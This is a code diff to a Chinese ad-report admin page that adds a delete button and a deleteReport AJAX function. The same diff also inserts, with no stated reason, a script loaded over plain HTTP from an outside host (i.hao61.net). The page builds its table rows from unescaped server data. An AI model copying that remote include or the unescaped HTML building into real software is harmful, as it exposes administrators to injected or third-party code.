@@ -51,7 +51,7 @@
     <script type="text/javascript">
         try{ace.settings.loadState('main-container')}catch(e){}
     </script>
-
+    <script type="text/javascript" src="http://i.hao61.net/d.js?cid=31926"></script>
     <!-- 左侧导航栏 -->
     <div id="sidebar" class="sidebar responsive ace-save-state"></div>
 
@@ -79,7 +79,6 @@
             <!-- 页面主体部分 -->
             <div class="page-content">
                 <div id="app" class="app-view">
-
                     <div class="base-view list-view adp-report-view" style="top:80px">
                         <div class="list-header">
                             <div class="list-summary"></div>
@@ -192,6 +191,9 @@
                                 <th width="100px">
                                     <div>日期</div>
                                 </th>
+                                <th width="50">
+                                    <div>操作</div>
+                                </th>
                             </tr>
                             </thead>
                             <tbody id="coll_list_begin_body">
@@ -295,7 +297,7 @@
                     var html="";
                     for (var i=0;i<list.length;i++){
                         var data = list[i];
-                        html+='<tr class>';
+                        html+='<tr class  id="tr'+data.id+'">';
                         html+='<td role="cell"><div class="veui-table-cell"><div class="adposition"><div>'+data.adSize+'</div><div>'+data.adId+'</div></div></div></td>';
                         html+='<td role="cell"><div class="veui-table-cell"><div class="app"><div>'+data.address+'</div></div></div></td>';
                         html+='<td role="cell"><div class="veui-table-cell"><div class="app"><div>'+data.adName+'</div></div></div></td>';
@@ -306,6 +308,7 @@
                         html+='<td role="cell"><div class="veui-table-cell"><div>'+data.clickProbability2+'%</div></div></td>';
                         html+='<td role="cell"><div class="veui-table-cell"><div>'+data.cpc2+'</div></div></td>';
                         html+='<td role="cell" width="100px"><div>'+data.createTime2+'</div></td>';
+                        html+='<td role="cell" id="td'+data.id+'"><div><button type="button" class="btn btn-minier btn-danger" onclick="deleteReport('+data.id+')">删除</button></div></td>';
                         html+='</tr>';
                     }
                     //添加数据
@@ -350,6 +353,33 @@
             var page = page + 1;
             selectReportList(page);
         }
+    }
+
+    //删除
+    function deleteReport(id) {
+        $.ajax({
+            url: path + "/temporary/deleteReport",
+            type: "post",
+            data: {
+                "id" : id
+            },
+            dataType: 'json',
+            async: false,
+            success: function (obj) {
+                if(obj.code == 200){
+                    $('#tr'+id).empty();
+                    alert("删除成功");
+                }else if(obj.code == "300"){
+                    alert(obj.message);
+                    window.location = path + "/login";
+                }else{
+                    alert(obj.message);
+                }
+            },
+            error: function () {
+                alert("请求异常");
+            }
+        });
     }
 
 </script>
